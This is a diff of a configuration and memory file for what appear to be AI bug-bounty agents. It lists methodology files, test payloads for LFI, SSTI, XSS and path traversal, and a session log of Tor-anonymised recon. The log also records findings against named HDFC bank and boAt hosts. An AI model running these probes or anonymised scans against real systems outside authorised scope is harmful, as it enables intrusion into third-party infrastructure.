+- `~/.config/opencode/common/SQLMAP_GHAURI.md` — SQLMap + Ghauri WAF bypass techniques
+- `~/.config/opencode/common/CT_MONITORING.md` — Real-time CT log subdomain monitoring
+- `~/.config/opencode/common/REACT2SHELL.md` — CVE-2025-55182 React2Shell RCE hunting
+- `~/.config/opencode/common/AUTH_SESSION.md` — Auth + session management vulnerability checklist
+- `~/.config/opencode/common/MASS_ASSIGNMENT.md` — Mass assignment JSON payload testing
+- `~/.config/opencode/common/REGISTRATION_BUGS.md` — 22 registration vulnerability checklist
+- `~/.config/opencode/common/ACTUATOR.md` — Spring Boot Actuator discovery + exploitation
+- `~/.config/opencode/common/BLIND_XSS.md` — Blind XSS + PasteJacking techniques
+- `~/.config/opencode/common/CACHE_DECEPTION.md` — Web Cache Deception exploitation
+- `~/.config/opencode/common/PUNYCODE_ATO.md` — Punycode IDN 0-click ATO
+- `~/.config/opencode/common/S3_BUCKETS.md` — S3 bucket recon + exploitation
+- `~/.config/opencode/common/SWAGGER_UI.md` — Swagger UI XSS + HTML injection
+- `~/.config/opencode/common/GITHUB_RECON.md` — GitHub recon + .git exposure
+- `~/.config/opencode/common/ORIGIN_IP.md` — Origin IP discovery behind WAF (11+ methods)
+- `~/.config/opencode/common/CRLF_INJECTION.md` — CRLF injection techniques
 - `~/.config/opencode/common/CWE_DATABASE.md` — CWE/CVSS/WAF bypass reference
 - `~/.config/opencode/common/TOOLS_REFERENCE.md` — Tool installation + usage
 - `~/.config/opencode/common/SCOPE_POLICY.md` — Program scope + policy rules
@@ -3487,7 +3487,7 @@ Save EVERY finding to `~/recon_reports/companies/<program>/unreported/` with:
 - `~/.config/opencode/common/SSRF_ADVANCED.md` — Advanced SSRF exploitation
 - `~/.config/opencode/common/WAF_BYPASS_ADVANCED.md` — Extended WAF bypass
 - `~/.config/opencode/agent_memory/hunter.md` — Personal memory/learning
-- `~/recon_reports/docs/LOSTSEC_METHODS.md` — LostSec full methodology
+- `~/recon_reports/docs/METHODS.md` — Community full methodology
 - `~/recon_reports/docs/METHODOLOGIES.md` — Full technique reference
 - `~/bugbounty-targets-and-osint.md` — 20+ bug bounty program details
 
@@ -3560,7 +3560,7 @@ done
 | **SQLi** | Error contains SQL syntax / `information_schema` / delayed response | Error is generic "An error occurred" with no SQL details |
 | **XSS** | Browser executes JS (use Playwright) | Payload reflected but HTML-escaped |
 | **Reflected XSS** | Payload appears unescaped in response AND browser executes | `<` becomes `&lt;` |
-| **DOM XSS** | Playwright confirms `alert()` fires | Regex check on response (can't confirm DOM) |
+| **DOM XSS** | Playwright confirms `alert` fires | Regex check on response (can't confirm DOM) |
 | **SSRF** | Callback received OR response reflects internal data | Response just echoes payload back |
 | **LFI** | `/etc/passwd` contents visible in response | Only error message or directory listing |
 | **SSTI** | `{{7*7}}` returns "49" | Only returns raw string `{{7*7}}` |
@@ -3574,8 +3574,8 @@ done
 ### Step 7: Browser Validation (for XSS)
 ```bash
 # Use Playwright to confirm actual JS execution
-# If alert() fires → confirmed
-# If no alert() despite payload in response → REJECT
+# If alert fires → confirmed
+# If no alert despite payload in response → REJECT
 ```
 
 ### Step 8: False Positive Signature Check
@@ -3627,9 +3627,9 @@ A VERIFIED finding must include:
 - `~/.config/opencode/common/CHAINING_VULNS.md` — Chain verification
 - `~/.config/opencode/common/SSRF_ADVANCED.md` — SSRF confirmation methods
 - `~/.config/opencode/common/WAF_BYPASS_ADVANCED.md` — Bypass verification
-- `~/.config/opencode/common/LOSTSEC_SQLMAP_GHAURI.md` — SQLi verification + WAF bypass confirmation
-- `~/.config/opencode/common/LOSTSEC_AUTH_SESSION.md` — Auth/session testing verification
-- `~/.config/opencode/common/LOSTSEC_REACT2SHELL.md` — React2Shell RCE verification
+- `~/.config/opencode/common/SQLMAP_GHAURI.md` — SQLi verification + WAF bypass confirmation
+- `~/.config/opencode/common/AUTH_SESSION.md` — Auth/session testing verification
+- `~/.config/opencode/common/REACT2SHELL.md` — React2Shell RCE verification
 - `~/.config/opencode/agent_memory/verifier.md` — Personal memory
 - `~/recon_reports/verified_findings/` — Output directory
 - `~/recon_reports/rejected_findings/` — Rejected findings
@@ -3810,9 +3810,9 @@ Always include the CWE identifier in the description.
 - `~/.config/opencode/common/SCOPE_POLICY.md` — Program rules
 - `~/.config/opencode/common/TRAINING_GUIDE.md` — Full training (reporting section)
 - `~/.config/opencode/common/CHAINING_VULNS.md` — Chain reporting tips
-- `~/.config/opencode/common/LOSTSEC_GOOGLE_API_KEYS.md` — Google API key impact reporting
-- `~/.config/opencode/common/LOSTSEC_REACT2SHELL.md` — React2Shell RCE report template
-- `~/.config/opencode/common/LOSTSEC_ACTUATOR.md` — Actuator exposure impact reporting
+- `~/.config/opencode/common/GOOGLE_API_KEYS.md` — Google API key impact reporting
+- `~/.config/opencode/common/REACT2SHELL.md` — React2Shell RCE report template
+- `~/.config/opencode/common/ACTUATOR.md` — Actuator exposure impact reporting
 - `~/.config/opencode/agent_memory/reporter.md` — Personal memory
 - `~/recon_reports/verified_findings/` — Input (verified findings)
 - `~/recon_reports/bugbase_reports/` — Output directory
@@ -3908,7 +3908,7 @@ For every plan, ask:
 
 ### Template: Full Web App
 ```
-TARGET: 
+TARGET:
 SCOPE:
 TECH STACK (researched):
 PRIORITY VECTORS:
@@ -3950,24 +3950,24 @@ QUICK CHECKS:
 - `~/.config/opencode/common/CHAINING_VULNS.md` — Chain planning
 - `~/.config/opencode/common/SSRF_ADVANCED.md` — SSRF attack vectors
 - `~/.config/opencode/common/WAF_BYPASS_ADVANCED.md` — Bypass planning
-- `~/.config/opencode/common/LOSTSEC_WORKFLOW.md` — Chaos→HTTPX→Naabu→Nmap→Nuclei→FFUF planning
-- `~/.config/opencode/common/LOSTSEC_GOOGLE_API_KEYS.md` — API key hunting plan
-- `~/.config/opencode/common/LOSTSEC_IIS_HACKING.md` — IIS recon plan
-- `~/.config/opencode/common/LOSTSEC_SQLMAP_GHAURI.md` — SQLi WAF bypass plan
-- `~/.config/opencode/common/LOSTSEC_CT_MONITORING.md` — CT monitoring plan
-- `~/.config/opencode/common/LOSTSEC_REACT2SHELL.md` — React2Shell hunt plan
-- `~/.config/opencode/common/LOSTSEC_AUTH_SESSION.md` — Auth testing plan
-- `~/.config/opencode/common/LOSTSEC_MASS_ASSIGNMENT.md` — Mass assignment plan
-- `~/.config/opencode/common/LOSTSEC_REGISTRATION_BUGS.md` — Registration bug plan
-- `~/.config/opencode/common/LOSTSEC_ACTUATOR.md` — Actuator exploitation plan
-- `~/.config/opencode/common/LOSTSEC_BLIND_XSS.md` — Blind XSS hunt plan
-- `~/.config/opencode/common/LOSTSEC_CACHE_DECEPTION.md` — Cache deception plan
-- `~/.config/opencode/common/LOSTSEC_PUNYCODE_ATO.md` — Punycode ATO plan
-- `~/.config/opencode/common/LOSTSEC_S3_BUCKETS.md` — S3 bucket plan
-- `~/.config/opencode/common/LOSTSEC_SWAGGER_UI.md` — Swagger UI plan
-- `~/.config/opencode/common/LOSTSEC_GITHUB_RECON.md` — GitHub recon plan
-- `~/.config/opencode/common/LOSTSEC_ORIGIN_IP.md` — Origin IP discovery plan
-- `~/.config/opencode/common/LOSTSEC_CRLF_INJECTION.md` — CRLF injection plan
+- `~/.config/opencode/common/WORKFLOW.md` — Chaos→HTTPX→Naabu→Nmap→Nuclei→FFUF planning
+- `~/.config/opencode/common/GOOGLE_API_KEYS.md` — API key hunting plan
+- `~/.config/opencode/common/IIS_HACKING.md` — IIS recon plan
+- `~/.config/opencode/common/SQLMAP_GHAURI.md` — SQLi WAF bypass plan
+- `~/.config/opencode/common/CT_MONITORING.md` — CT monitoring plan
+- `~/.config/opencode/common/REACT2SHELL.md` — React2Shell hunt plan
+- `~/.config/opencode/common/AUTH_SESSION.md` — Auth testing plan
+- `~/.config/opencode/common/MASS_ASSIGNMENT.md` — Mass assignment plan
+- `~/.config/opencode/common/REGISTRATION_BUGS.md` — Registration bug plan
+- `~/.config/opencode/common/ACTUATOR.md` — Actuator exploitation plan
+- `~/.config/opencode/common/BLIND_XSS.md` — Blind XSS hunt plan
+- `~/.config/opencode/common/CACHE_DECEPTION.md` — Cache deception plan
+- `~/.config/opencode/common/PUNYCODE_ATO.md` — Punycode ATO plan
+- `~/.config/opencode/common/S3_BUCKETS.md` — S3 bucket plan
+- `~/.config/opencode/common/SWAGGER_UI.md` — Swagger UI plan
+- `~/.config/opencode/common/GITHUB_RECON.md` — GitHub recon plan
+- `~/.config/opencode/common/ORIGIN_IP.md` — Origin IP discovery plan
+- `~/.config/opencode/common/CRLF_INJECTION.md` — CRLF injection plan
 - `~/recon_reports/docs/SCOPE_REFERENCE.md` — Tracked program scope
 - `~/bugbounty-targets-and-osint.md` — Program details
 
@@ -4116,24 +4116,24 @@ If an agent says something confidently wrong (like claiming a finding when it's 
 - `~/.config/opencode/common/CHAINING_VULNS.md` — Chain methodology
 - `~/.config/opencode/common/SSRF_ADVANCED.md` — SSRF exploitation
 - `~/.config/opencode/common/WAF_BYPASS_ADVANCED.md` — WAF bypass
-- `~/.config/opencode/common/LOSTSEC_WORKFLOW.md` — LostSec core pipeline
-- `~/.config/opencode/common/LOSTSEC_GOOGLE_API_KEYS.md` — Google API key technique
-- `~/.config/opencode/common/LOSTSEC_IIS_HACKING.md` — IIS hacking technique
-- `~/.config/opencode/common/LOSTSEC_SQLMAP_GHAURI.md` — SQLi WAF bypass technique
-- `~/.config/opencode/common/LOSTSEC_CT_MONITORING.md` — CT monitoring technique
-- `~/.config/opencode/common/LOSTSEC_REACT2SHELL.md` — React2Shell RCE technique
-- `~/.config/opencode/common/LOSTSEC_AUTH_SESSION.md` — Auth testing technique
-- `~/.config/opencode/common/LOSTSEC_MASS_ASSIGNMENT.md` — Mass assignment technique
-- `~/.config/opencode/common/LOSTSEC_REGISTRATION_BUGS.md` — Registration bug technique
-- `~/.config/opencode/common/LOSTSEC_ACTUATOR.md` — Actuator exploitation technique
-- `~/.config/opencode/common/LOSTSEC_BLIND_XSS.md` — Blind XSS technique
-- `~/.config/opencode/common/LOSTSEC_CACHE_DECEPTION.md` — Cache deception technique
-- `~/.config/opencode/common/LOSTSEC_PUNYCODE_ATO.md` — Punycode ATO technique
-- `~/.config/opencode/common/LOSTSEC_S3_BUCKETS.md` — S3 bucket technique
-- `~/.config/opencode/common/LOSTSEC_SWAGGER_UI.md` — Swagger UI technique
-- `~/.config/opencode/common/LOSTSEC_GITHUB_RECON.md` — GitHub recon technique
-- `~/.config/opencode/common/LOSTSEC_ORIGIN_IP.md` — Origin IP discovery technique
-- `~/.config/opencode/common/LOSTSEC_CRLF_INJECTION.md` — CRLF injection technique
+- `~/.config/opencode/common/WORKFLOW.md` — Community core pipeline
+- `~/.config/opencode/common/GOOGLE_API_KEYS.md` — Google API key technique
+- `~/.config/opencode/common/IIS_HACKING.md` — IIS hacking technique
+- `~/.config/opencode/common/SQLMAP_GHAURI.md` — SQLi WAF bypass technique
+- `~/.config/opencode/common/CT_MONITORING.md` — CT monitoring technique
+- `~/.config/opencode/common/REACT2SHELL.md` — React2Shell RCE technique
+- `~/.config/opencode/common/AUTH_SESSION.md` — Auth testing technique
+- `~/.config/opencode/common/MASS_ASSIGNMENT.md` — Mass assignment technique
+- `~/.config/opencode/common/REGISTRATION_BUGS.md` — Registration bug technique
+- `~/.config/opencode/common/ACTUATOR.md` — Actuator exploitation technique
+- `~/.config/opencode/common/BLIND_XSS.md` — Blind XSS technique
+- `~/.config/opencode/common/CACHE_DECEPTION.md` — Cache deception technique
+- `~/.config/opencode/common/PUNYCODE_ATO.md` — Punycode ATO technique
+- `~/.config/opencode/common/S3_BUCKETS.md` — S3 bucket technique
+- `~/.config/opencode/common/SWAGGER_UI.md` — Swagger UI technique
+- `~/.config/opencode/common/GITHUB_RECON.md` — GitHub recon technique
+- `~/.config/opencode/common/ORIGIN_IP.md` — Origin IP discovery technique
+- `~/.config/opencode/common/CRLF_INJECTION.md` — CRLF injection technique
 
 ---
 
@@ -4200,7 +4200,7 @@ You are a recon specialist. Your job is fast, thorough reconnaissance:
 
 Methodology references:
 - `~/recon_reports/docs/METHODOLOGIES.md` — Full recon techniques
-- `~/recon_reports/docs/LOSTSEC_METHODS.md` — Chaos→HTTPX→Naabu→Nmap→Nuclei→FFUF pipeline
+- `~/recon_reports/docs/METHODS.md` — Chaos→HTTPX→Naabu→Nmap→Nuclei→FFUF pipeline
 - `~/recon_reports/docs/SCOPE_REFERENCE.md` — Target scope verification
 - `~/recon_reports/companies/` — Per-target findings directory
 
@@ -4210,7 +4210,7 @@ Methodology references:
 
 ## Memory: hunter
 
-# LostSec Hunter - Session Memory
+# Community Hunter - Session Memory
 
 ## Mistake: 2026-07-05 — Anonymity Stack Deployment Crashed Internet
 - **Error**: Deployed anonymity stack (Tor + UFW kill switch) without proper verification steps. Tor config had deprecated options that caused daemon crash (`NumEntryGuards`, `NumDirectoryGuards`, `DNSListenAddress` standalone syntax). iptables OUTPUT policy was set to DROP but didn't stick — never verified with `iptables -L` to check the policy line. UFW rules added port 443 allow for Tor bootstrap but that also allowed ALL direct traffic through port 443, defeating the kill switch. The combined failure: Tor crashed → firewall blocked everything → complete internet blackout.
@@ -4317,7 +4317,7 @@ CircuitStreamTimeout   ← Only in newer Tor - verify with --version first
 ## Session: 2026-07-06 (Recon to Master — boAt Lifestyle)
 
 ### Part 1: Recon Session — What Worked
-1. **Full LostSec recon pipeline**: subfinder → crt.sh → waybackurls → gau → dnsx → httpx → nmap → nuclei — fully executed
+1. **Full Community recon pipeline**: subfinder → crt.sh → waybackurls → gau → dnsx → httpx → nmap → nuclei — fully executed
 2. **Wayback CDX via proxychains**: Bypassed India block on web.archive.org using Tor
 3. **15+ NEW subdomains discovered**: api-gst, hearable-ai, grafana-gcp, naavik, devretailer, testretailer, dev-boathive, discounts, prod-hub-api, hr-dock, my, sg, dev-aihub, f, dev-hearable-ai
 4. **testretailer Laravel debug mode**: Full stack trace with server paths exposed
@@ -4545,7 +4545,7 @@ Findings 27-32 (from Crewex Deep Dive Part 2):
 
 ### 🟢 VERIFIED (Reportable)
 
-| # | Finding | Target | Severity | CVSS | Reproducibility | 
+| # | Finding | Target | Severity | CVSS | Reproducibility |
 |---|---------|--------|----------|------|-----------------|
 | 12 | **ENET Struts2 Path Traversal + IHS 8.5.5 EoL** — `GET /EnetMVC/../` → IHS welcome page HTTP 200, 3598B, 3/3. All depths work. EoL server from 2012. | hbenetinterap.hdfcuat.bank.in | **HIGH** | **7.5** | ✅ 3/3 |
 | 13 | **SMARTHUB Merchant User Enum** — `checkUserExist` returns `Invalid|N` with attempt count. ForgotPassword: `forgotPasswordStatus="Failure"` for invalid. Rate limit per-email. | smarthub.biz.hdfc.bank.in | **MED-HIGH** | **6.5** | ✅ 3/3 |
@@ -4556,11 +4556,11 @@ Findings 27-32 (from Crewex Deep Dive Part 2):
 
 ### 🟡 PARTIAL (Limited / Not Reportable)
 
-| # | Finding | Verdict | 
+| # | Finding | Verdict |
 |---|---------|---------|
 | 18 | **WebLogic REDACTED_INTERNAL_IP Admin Console** — Exposed (HTTP 200, 3/3) but CVE-2020-14882/14883 BLOCKED by nginx. WLS-WSAT GONE (404). No RCE achieved. | **PARTIAL — Exposed EoL console (HIGH)`** downgraded from Critical RCE |
 | 19 | **CBX Double-Encoded Path Traversal** — `..%252f` → HTTP 500 (detected). File reads → HTTP 000 timeout. Not exploitable. | **PARTIAL — UNREPORTABLE** |
-| 20 | **CBX OTL fetch() Bypass** — Client-side only. Server validates auth independently. | **PARTIAL — UNREPORTABLE** |
+| 20 | **CBX OTL fetch Bypass** — Client-side only. Server validates auth independently. | **PARTIAL — UNREPORTABLE** |
 
 ### 🔴 REJECTED / INFORMATIONAL
 
